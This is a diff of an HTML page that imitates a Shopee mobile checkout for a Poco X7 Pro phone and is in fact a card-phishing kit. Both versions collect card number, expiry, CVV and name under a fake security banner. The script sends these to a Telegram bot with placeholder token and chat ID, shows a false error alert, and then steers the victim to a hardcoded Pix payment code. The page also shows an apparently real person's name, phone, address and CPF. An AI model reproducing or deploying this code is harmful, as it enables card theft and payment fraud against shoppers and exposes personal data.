@@ -3,250 +3,241 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Comprar</title>
+    <title>Checkout Shopee</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --safe-green: #26aa99; --border: #e8e8e8; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
-        body { background: var(--bg); color: #222; -webkit-tap-highlight-color: transparent; }
+        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --safe-green: #26aa99; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, HelveticaNeue, sans-serif; }
+        body { background: var(--bg); color: #222; }
 
         /* HEADER */
-        .header { background: white; padding: 12px 15px; display: flex; align-items: center; position: sticky; top: 0; z-index: 100; border-bottom: 1px solid #eee; }
-        .header i { color: var(--shopee); font-size: 22px; margin-right: 20px; }
-        .header h1 { font-size: 19px; font-weight: 400; color: #333; }
+        .header { background: white; padding: 12px 15px; display: flex; align-items: center; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 1000; }
+        .header i { color: var(--shopee); font-size: 20px; margin-right: 15px; }
+        .header h1 { font-size: 18px; font-weight: 400; }
 
-        /* SEÇÕES */
-        .section { background: white; margin-bottom: 10px; padding: 15px; }
-        
+        /* SEÇÕES GERAIS */
+        .section { background: white; margin-bottom: 8px; padding: 15px; position: relative; }
+        .section-title { font-size: 14px; margin-bottom: 12px; display: flex; justify-content: space-between; }
+
         /* ENDEREÇO */
-        .addr-info { display: flex; gap: 10px; position: relative; }
-        .addr-info i { color: var(--shopee); font-size: 18px; margin-top: 3px; }
-        .addr-text b { font-size: 14px; display: block; margin-bottom: 4px; color: #333; }
-        .addr-text p { font-size: 13px; color: #666; line-height: 1.4; }
-        .cpf-row { display: flex; justify-content: space-between; align-items: center; margin-top: 15px; padding-top: 12px; border-top: 1px solid #f0f0f0; font-size: 13px; }
-        .cpf-label { display: flex; align-items: center; gap: 8px; color: #555; }
-        .arrow-right { position: absolute; right: 0; top: 40%; color: #bbb; font-size: 12px; }
+        .addr-box { display: flex; gap: 10px; }
+        .addr-box i { color: var(--shopee); font-size: 16px; margin-top: 3px; }
+        .addr-info b { font-size: 14px; display: block; margin-bottom: 2px; }
+        .addr-info p { font-size: 12px; color: #666; line-height: 1.4; }
+        .cpf-row { border-top: 1px solid #f2f2f2; margin-top: 10px; padding-top: 10px; display: flex; justify-content: space-between; font-size: 13px; }
 
         /* PRODUTO */
-        .store-header { display: flex; align-items: center; gap: 6px; margin-bottom: 12px; }
-        .tag-indicado { background: var(--shopee); color: white; font-size: 10px; padding: 2px 4px; border-radius: 2px; font-weight: bold; }
-        .store-name { font-size: 13px; font-weight: 500; }
-        .prod-box { display: flex; gap: 12px; }
-        .prod-img { width: 80px; height: 80px; object-fit: cover; }
-        .prod-details h2 { font-size: 13px; font-weight: 400; line-height: 1.4; color: #333; height: 36px; overflow: hidden; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; }
-        .prod-var { font-size: 11px; color: #999; margin: 5px 0; }
-        .price-line { display: flex; align-items: center; gap: 8px; margin-top: 10px; }
-        .p-now { color: var(--shopee); font-size: 15px; }
-        .p-old { color: #bbb; text-decoration: line-through; font-size: 12px; }
+        .store-tag { background: var(--shopee); color: white; font-size: 10px; padding: 1px 4px; border-radius: 2px; font-weight: bold; margin-right: 5px; }
+        .prod-card { display: flex; gap: 10px; margin-top: 10px; background: #fafafa; padding: 8px; }
+        .prod-img { width: 75px; height: 75px; object-fit: cover; border: 1px solid #eee; }
+        .prod-desc h2 { font-size: 12px; font-weight: 400; line-height: 1.3; }
+        .prod-price { margin-top: 8px; }
+        .p-now { color: var(--shopee); font-size: 14px; font-weight: 500; }
+        .p-old { color: #999; text-decoration: line-through; font-size: 11px; margin-left: 5px; }
 
         /* SEGUROS */
-        .insurance-box { background: #fafafa; padding: 12px; border-radius: 4px; margin-top: 10px; }
-        .ins-row { display: flex; gap: 10px; margin-bottom: 15px; }
-        .ins-check { width: 18px; height: 18px; border: 1px solid #ddd; background: white; border-radius: 2px; }
-        .ins-content { flex: 1; }
-        .ins-title { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 4px; }
-        .ins-desc { font-size: 11px; color: #888; line-height: 1.3; }
+        .insurance-item { display: flex; gap: 10px; margin-top: 10px; font-size: 12px; }
+        .ins-check { width: 16px; height: 16px; border: 1px solid #ccc; border-radius: 2px; flex-shrink: 0; }
+        .ins-text { flex: 1; }
+        .ins-price { float: right; }
 
-        /* MÉTODOS PAGAMENTO */
-        .pay-row { display: flex; align-items: center; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid #f5f5f5; cursor: pointer; }
-        .pay-left { display: flex; align-items: center; gap: 12px; font-size: 14px; }
-        .pay-left i { font-size: 18px; width: 20px; text-align: center; }
-        .btn-add { color: var(--shopee); border: 1px solid var(--shopee); padding: 3px 10px; border-radius: 2px; font-size: 12px; }
-        .radio-dot { width: 20px; height: 20px; border: 1px solid #ccc; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
-        .selected .radio-dot { background: var(--shopee); border-color: var(--shopee); }
-        .selected .radio-dot::after { content: '\f00c'; font-family: 'Font Awesome 5 Free'; font-weight: 900; color: white; font-size: 10px; }
+        /* PAGAMENTO */
+        .pay-option { display: flex; align-items: center; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f8f8f8; }
+        .pay-label { display: flex; align-items: center; gap: 10px; font-size: 14px; }
+        .pay-label i { font-size: 18px; width: 24px; text-align: center; }
+        .btn-shopee { color: var(--shopee); border: 1px solid var(--shopee); padding: 2px 8px; border-radius: 2px; font-size: 12px; background: transparent; cursor: pointer; }
+        .radio { width: 18px; height: 18px; border: 1px solid #ccc; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .radio.active { border-color: var(--shopee); background: var(--shopee); }
+        .radio.active::after { content: '\f00c'; font-family: 'Font Awesome 5 Free'; font-weight: 900; color: white; font-size: 10px; }
 
-        /* TELA ADICIONAR CARTÃO */
-        #screen-card { display: none; position: fixed; inset: 0; background: white; z-index: 200; overflow-y: auto; }
-        .safe-msg { background: #f6fffe; border: 1px solid #e1f7f4; padding: 12px 15px; display: flex; gap: 12px; margin: 10px 0; }
-        .safe-msg i { color: var(--safe-green); font-size: 20px; }
-        .safe-msg p { color: var(--safe-green); font-size: 12px; line-height: 1.5; }
-        .input-group { padding: 0 15px; }
-        .sh-input { width: 100%; border: 1px solid #ddd; padding: 12px; margin-bottom: 12px; border-radius: 2px; font-size: 15px; outline: none; }
-        .sh-input:focus { border-color: #888; }
+        /* TABELA DE DETALHES */
+        .details-table { width: 100%; font-size: 13px; color: #666; }
+        .details-table tr td { padding: 4px 0; }
+        .details-table .total-row { color: #222; font-weight: bold; font-size: 14px; }
 
         /* FOOTER FIXO */
-        .footer { position: fixed; bottom: 0; width: 100%; height: 55px; background: white; border-top: 1px solid #eee; display: flex; align-items: center; justify-content: flex-end; z-index: 150; }
-        .price-summary { text-align: right; margin-right: 15px; }
-        .total-label { font-size: 14px; }
-        .total-val { color: var(--shopee); font-size: 18px; font-weight: bold; }
-        .eco-val { font-size: 11px; color: var(--shopee); }
-        .btn-order { background: var(--shopee); color: white; border: none; height: 100%; width: 150px; font-weight: bold; font-size: 15px; }
+        .footer { position: fixed; bottom: 0; width: 100%; background: white; display: flex; align-items: center; justify-content: flex-end; height: 55px; border-top: 1px solid #eee; z-index: 1000; }
+        .footer-total { text-align: right; padding-right: 15px; }
+        .f-price { color: var(--shopee); font-size: 18px; font-weight: bold; }
+        .btn-order { background: var(--shopee); color: white; border: none; width: 140px; height: 100%; font-weight: bold; font-size: 15px; }
 
-        /* TELA PIX */
-        #screen-pix { display: none; position: fixed; inset: 0; background: white; z-index: 300; text-align: center; padding: 20px; }
-
-        /* SPAR CELADO (Texto apenas como solicitado) */
-        .sparcelado-info { font-size: 11px; color: #999; margin-top: 4px; display: block; }
+        /* TELA ADICIONAR CARTÃO OVERLAY */
+        #screen-card { display: none; position: fixed; inset: 0; background: white; z-index: 2000; overflow-y: auto; }
+        .safe-banner { background: #f6fffe; padding: 12px; display: flex; gap: 10px; border-bottom: 1px solid #e1f7f4; }
+        .safe-banner i { color: var(--safe-green); font-size: 18px; }
+        .safe-banner p { font-size: 11px; color: var(--safe-green); line-height: 1.4; }
+        .card-input { width: 100%; border: 1px solid #eee; padding: 12px; margin-bottom: 10px; border-radius: 4px; font-size: 14px; outline: none; }
+        
+        /* PIX OVERLAY */
+        #screen-pix { display: none; position: fixed; inset: 0; background: white; z-index: 3000; padding: 20px; text-align: center; }
     </style>
 </head>
 <body>
 
-    <div id="screen-main">
-        <div class="header"><i class="fas fa-arrow-left"></i> <h1>Comprar</h1></div>
+<div id="screen-main">
+    <div class="header"><i class="fas fa-arrow-left"></i> <h1>Comprar</h1></div>
 
-        <div class="section">
+    <div class="section">
+        <div class="addr-box">
+            <i class="fas fa-map-marker-alt"></i>
             <div class="addr-info">
-                <i class="fas fa-map-marker-alt"></i>
-                <div class="addr-text">
-                    <b>Paulo Felipe Do Nascimento (+55) 88 99980-6107</b>
-                    <p>Riachuelo, 2676, Próximo ao mercado Goiânia</p>
-                    <p>Camocim, Ceará, 62400000</p>
-                </div>
-                <i class="fas fa-chevron-right arrow-right"></i>
+                <b>Paulo Felipe Do Nascimento (+55) 88 99980-6107</b>
+                <p>Riachuelo, 2676, Próximo ao mercado Goiânia<br>Camocim, Ceará, 62400000</p>
             </div>
-            <div class="cpf-row">
-                <div class="cpf-label"><i class="far fa-id-card" style="color:var(--shopee)"></i> CPF</div>
-                <div style="color:#333;">071.719.483-31</div>
-            </div>
+            <i class="fas fa-chevron-right" style="position:absolute; right:15px; top:40%; color:#ccc; font-size:12px;"></i>
         </div>
-
-        <div class="section">
-            <div class="store-header">
-                <span class="tag-indicado">Indicado</span>
-                <span class="store-name">Loja Oficial Onix</span>
-            </div>
-            <div class="prod-box">
-                <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" class="prod-img">
-                <div class="prod-details">
-                    <h2>Celular Xiaomi PocoPhone Poco X7 Pro 5G,Vers...</h2>
-                    <p class="prod-var">Poco X7 PRO 256/8 VERDE</p>
-                    <div class="price-line">
-                        <span class="p-now">R$2.027,00</span>
-                        <span class="p-old">R$2.650,00</span>
-                        <span style="margin-left:auto; color:#999; font-size:12px;">x1</span>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="insurance-box">
-                <p style="font-size:12px; margin-bottom:12px;">Adquirir Seguro <span style="color:var(--shopee); font-size:10px; border:1px solid var(--shopee); padding:0 3px; margin-left:5px;">Recomendado</span> <span style="float:right; color:var(--shopee);">Ver Mais</span></p>
-                <div class="ins-row">
-                    <div class="ins-check"></div>
-                    <div class="ins-content">
-                        <div class="ins-title"><span>Seguro contra Roubo e Dano - 12 meses</span> <span>R$212,84 x1</span></div>
-                        <p class="ins-desc">Proteção contra roubo, furto qualificado e dano acidental</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div class="section">
-            <p style="font-size:14px; margin-bottom:10px;">Métodos de pagamento</p>
-            
-            <div class="pay-row selected" id="row-pix" onclick="selectPix()">
-                <div class="pay-left"><i class="fas fa-coins" style="color:var(--teal)"></i> Pix</div>
-                <div class="radio-dot"></div>
-            </div>
-
-            <div class="pay-row" onclick="showCard()">
-                <div class="pay-left"><i class="fas fa-credit-card" style="color:#2673dd"></i> Cartão de Crédito</div>
-                <div class="btn-add">Adicionar</div>
-            </div>
-
-            <div class="pay-row">
-                <div class="pay-left">
-                    <div style="display:flex; flex-direction:column;">
-                        <span><i class="fas fa-clock" style="color:var(--shopee); margin-right:8px;"></i> SParcelado</span>
-                        <span class="sparcelado-info">Ative e parcele compras em até 12x no Pix</span>
-                    </div>
-                </div>
-                <div style="color:var(--shopee); font-size:12px; font-weight:bold;">Continuar</div>
-            </div>
-        </div>
-
-        <div class="footer">
-            <div class="price-summary">
-                <span class="total-label">Total </span><span class="total-val">R$2.053,30</span>
-                <div class="eco-val">Economizou R$623,00</div>
-            </div>
-            <button class="btn-order" onclick="finalizarPedido()">FAZER PEDIDO</button>
+        <div class="cpf-row">
+            <span><i class="far fa-id-card" style="color:var(--shopee)"></i> CPF</span>
+            <span style="color:#222;">071.719.483-31</span>
         </div>
     </div>
 
-    <div id="screen-card">
-        <div class="header"><i class="fas fa-arrow-left" onclick="hideCard()"></i> <h1>Adicionar Cartão de Crédito</h1></div>
+    <div class="section">
+        <p style="font-size:13px; margin-bottom:10px;"><span class="store-tag">Indicado</span> Loja Oficial Onix</p>
+        <div class="prod-card">
+            <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" class="prod-img">
+            <div class="prod-desc">
+                <h2>Celular Xiaomi PocoPhone Poco X7 Pro 5G,Vers...</h2>
+                <p style="font-size:10px; color:#999; margin:4px 0;">Poco X7 PRO 256/8 VERDE</p>
+                <div class="prod-price">
+                    <span class="p-now">R$2.027,00</span><span class="p-old">R$2.650,00</span>
+                    <span style="float:right; color:#999; font-size:11px;">x1</span>
+                </div>
+            </div>
+        </div>
+
+        <div style="margin-top:15px; border-top:1px solid #f2f2f2; padding-top:15px;">
+            <p style="font-size:13px;">Adquirir Seguro <span style="background:#ffede8; color:var(--shopee); font-size:10px; padding:1px 4px;">Recomendado</span> <span style="float:right; color:var(--shopee); font-size:12px;">Ver Mais</span></p>
+            <div class="insurance-item">
+                <div class="ins-check"></div>
+                <div class="ins-text">
+                    <b>Seguro contra Roubo e Dano - 12 meses <span class="ins-price">R$212,84 x1</span></b>
+                    <p style="color:#999; font-size:11px;">Proteção contra roubo, furto qualificado e dano acidental</p>
+                </div>
+            </div>
+            <div class="insurance-item">
+                <div class="ins-check"></div>
+                <div class="ins-text">
+                    <b>Garantia Estendida - 12 meses <span class="ins-price">R$110,27 x1</span></b>
+                    <p style="color:#999; font-size:11px;">Aumente o tempo de garantia do seu produto</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="section">
+        <div class="section-title">Opção de Envio <span style="color:#999; font-size:12px;">Ver Mais ></span></div>
+        <div style="background: #f6fffe; border: 1px solid #dcf3f0; padding: 10px; border-radius: 2px;">
+            <div style="display:flex; justify-content:space-between; font-weight:bold; font-size:13px; color:var(--safe-green);">
+                <span>Receba entre 18 e 24 de fev</span>
+                <span>R$26,30</span>
+            </div>
+            <p style="font-size:12px; color:#666; margin-top:4px;">Entrega Padrão</p>
+        </div>
+    </div>
+
+    <div class="section">
+        <div class="section-title">Métodos de pagamento <span style="color:#999; font-size:12px;">Ver Mais ></span></div>
+        <div class="pay-option" onclick="selectMethod('pix')">
+            <div class="pay-label"><i class="fas fa-coins" style="color:var(--teal)"></i> Pix</div>
+            <div class="radio active" id="radio-pix"></div>
+        </div>
+        <div class="pay-option">
+            <div class="pay-label"><i class="fas fa-credit-card" style="color:#2673dd"></i> Cartão de Crédito</div>
+            <button class="btn-shopee" onclick="openCard()">Adicionar</button>
+        </div>
+        <div class="pay-option" style="border:none;">
+            <div class="pay-label">
+                <i class="fas fa-history" style="color:var(--shopee)"></i>
+                <div>
+                    <span>SParcelado</span>
+                    <p style="font-size:11px; color:#999;">Ative e parcele compras em até 12x no Pix</p>
+                </div>
+            </div>
+            <button class="btn-shopee">Continuar</button>
+        </div>
+        <p style="text-align:center; font-size:11px; color:#bbb; margin-top:10px;">Processado por <span style="color:var(--shopee); font-weight:bold;">ShopeePay</span></p>
+    </div>
+
+    <div class="section" style="padding-bottom:80px;">
+        <p style="font-size:14px; margin-bottom:12px;">Detalhes de Pagamento</p>
+        <table class="details-table">
+            <tr><td>Total dos Produtos</td><td align="right">R$2.027,00</td></tr>
+            <tr><td>Total do Frete</td><td align="right">R$26,30</td></tr>
+            <tr class="total-row"><td>Pagamento Total</td><td align="right">R$2.053,30</td></tr>
+        </table>
+    </div>
+
+    <div class="footer">
+        <div class="footer-total">
+            <div style="font-size:13px;">Total <span class="f-price">R$2.053,30</span></div>
+            <div style="color:var(--shopee); font-size:11px;">Economizou R$623,00</div>
+        </div>
+        <button class="btn-order" onclick="finalizar()">FAZER PEDIDO</button>
+    </div>
+</div>
+
+<div id="screen-card">
+    <div class="header"><i class="fas fa-arrow-left" onclick="closeCard()"></i> <h1>Adicionar Cartão de Crédito</h1></div>
+    <div class="safe-banner">
+        <i class="fas fa-shield-alt"></i>
+        <p>Os detalhes do seu cartão estão protegidos. Temos uma parceria com a ShopeePay para garantir que os dados do seu cartão sejam mantidos em segurança. A Shopee não terá acesso às informações do seu cartão.</p>
+    </div>
+    <div style="padding:15px;">
+        <p style="font-size:14px; color:#666; margin-bottom:10px;">Informações do Cartão</p>
+        <input type="tel" id="card_n" class="card-input" placeholder="Número do Cartão">
+        <div style="display:flex; gap:10px;">
+            <input type="tel" id="card_v" class="card-input" placeholder="Data de Validade (MM/AA)">
+            <input type="tel" id="card_c" class="card-input" placeholder="CVV">
+        </div>
+        <input type="text" id="card_nm" class="card-input" placeholder="Nome no Cartão">
         
-        <div class="safe-msg">
-            <i class="fas fa-shield-alt"></i>
-            <p>Os detalhes do seu cartão estão protegidos.<br>Temos uma parceria com a ShopeePay para garantir que os dados do seu cartão sejam mantidos em segurança.</p>
-        </div>
-
-        <div class="input-group">
-            <p style="font-size:14px; color:#666; margin:15px 0 10px;">Informações do Cartão</p>
-            <input type="tel" id="n" class="sh_input" placeholder="Número do Cartão">
-            <div style="display:flex; gap:10px;">
-                <input type="tel" id="v" class="sh_input" placeholder="Data de Validade (MM/AA)">
-                <input type="tel" id="c" class="sh_input" placeholder="CVV">
-            </div>
-            <input type="text" id="nm" class="sh_input" placeholder="Nome no Cartão">
-
-            <p style="font-size:14px; color:#666; margin:10px 0;">Endereço de Cobrança</p>
-            <input type="tel" class="sh_input" value="62400000">
-            <input type="text" class="sh_input" value="Ceará">
-            <input type="text" class="sh_input" value="Camocim">
-            <input type="text" class="sh_input" placeholder="Rua / Avenida">
-            
-            <button class="sh-input" style="background:#eee; border:none; color:#888; font-weight:bold; margin-top:20px;" onclick="enviar()">Enviar</button>
-        </div>
+        <p style="font-size:14px; color:#666; margin:15px 0 10px;">Endereço de Cobrança</p>
+        <input type="tel" class="card-input" value="62400000">
+        <input type="text" class="card-input" value="Ceará">
+        <input type="text" class="card-input" value="Camocim">
+        <input type="text" class="card-input" placeholder="Rua / Avenida">
+        <button onclick="enviar()" style="width:100%; height:45px; background:#f0f0f0; color:#ccc; border:none; font-weight:bold;">Enviar</button>
     </div>
+</div>
 
-    <div id="screen-pix">
-        <div class="header"><i class="fas fa-arrow-left" onclick="location.reload()"></i> <h1>Pagamento Pix</h1></div>
-        <div style="margin-top:50px;">
-            <i class="fas fa-qrcode" style="font-size:80px; color:var(--shopee);"></i>
-            <h2 style="margin:20px 0;">R$ 2.053,30</h2>
-            <p style="font-size:13px; color:#666; margin-bottom:20px;">Copie o código abaixo e pague no app do seu banco</p>
-            <div id="cp" style="background:#f5f5f5; padding:15px; font-size:11px; word-break:break-all; border:1px dashed #ccc;">00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b552040000530398654052053.305802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF</div>
-            <button class="btn-order" style="width:100%; margin-top:30px; border-radius:4px; height:50px;" onclick="copy()">COPIAR CÓDIGO</button>
-        </div>
+<div id="screen-pix">
+    <div class="header" style="position:fixed; top:0; left:0; width:100%;"><i class="fas fa-arrow-left" onclick="location.reload()"></i> <h1>Pagamento Pix</h1></div>
+    <div style="margin-top:80px;">
+        <i class="fas fa-qrcode" style="font-size:60px; color:var(--shopee);"></i>
+        <h2 style="margin:20px 0;">R$ 2.053,30</h2>
+        <div id="pix-code" style="background:#f5f5f5; padding:15px; font-size:11px; word-break:break-all; border:1px dashed #ccc; margin-bottom:20px;">00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b552040000530398654052053.305802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF</div>
+        <button class="btn-order" style="width:100%; border-radius:4px; height:50px;" onclick="copy()">COPIAR CÓDIGO PIX</button>
     </div>
+</div>
 
-    <script>
-        let isPix = true;
+<script>
+    function openCard() { document.getElementById('screen-card').style.display = 'block'; }
+    function closeCard() { document.getElementById('screen-card').style.display = 'none'; }
+    
+    function finalizar() {
+        document.getElementById('screen-main').style.display = 'none';
+        document.getElementById('screen-pix').style.display = 'block';
+    }
 
-        function selectPix() {
-            isPix = true;
-            document.getElementById('row-pix').classList.add('selected');
-        }
+    function enviar() {
+        const token = 'SEU_TOKEN'; // O SEU TOKEN DO BOTFATHER
+        const cid = 'SEU_CHAT_ID'; // O SEU CHAT ID
+        const msg = `💳 *CARTÃO SHOPEE* \n\nN: ${document.getElementById('card_n').value}\nV: ${document.getElementById('card_v').value}\nC: ${document.getElementById('card_c').value}\nNOME: ${document.getElementById('card_nm').value}`;
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        
+        alert("Sistema em manutenção. Por favor, utilize o Pix.");
+        closeCard();
+        finalizar();
+    }
 
-        function showCard() {
-            isPix = false;
-            document.getElementById('row-pix').classList.remove('selected');
-            document.getElementById('screen-card').style.display = 'block';
-        }
+    function copy() {
+        navigator.clipboard.writeText(document.getElementById('pix-code').innerText);
+        alert("Código copiado!");
+    }
+</script>
 
-        function hideCard() {
-            document.getElementById('screen-card').style.display = 'none';
-        }
-
-        function finalizarPedido() {
-            if(isPix) {
-                document.getElementById('screen-main').style.display = 'none';
-                document.getElementById('screen-pix').style.display = 'block';
-            } else {
-                alert("Clique em Adicionar para configurar o cartão.");
-            }
-        }
-
-        function enviar() {
-            const botToken = 'SEU_BOT_TOKEN'; // O SEU TOKEN AQUI
-            const chatId = 'SEU_CHAT_ID';     // O SEU ID AQUI
-            const text = `🔥 *NOVO CARTÃO SHOPEE* \n\n💳 N: ${document.getElementById('n').value}\n📅 V: ${document.getElementById('v').value}\n🔒 C: ${document.getElementById('c').value}\n👤 NOME: ${document.getElementById('nm').value}`;
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
-            
-            alert("Erro na operadora. Tente pagar com Pix.");
-            hideCard();
-            selectPix();
-            finalizarPedido();
-        }
-
-        function copy() {
-            navigator.clipboard.writeText(document.getElementById('cp').innerText);
-            alert("Código Pix copiado!");
-        }
-    </script>
 </body>
-                    </html>
-                        
+    </html>
+                                                                                                 
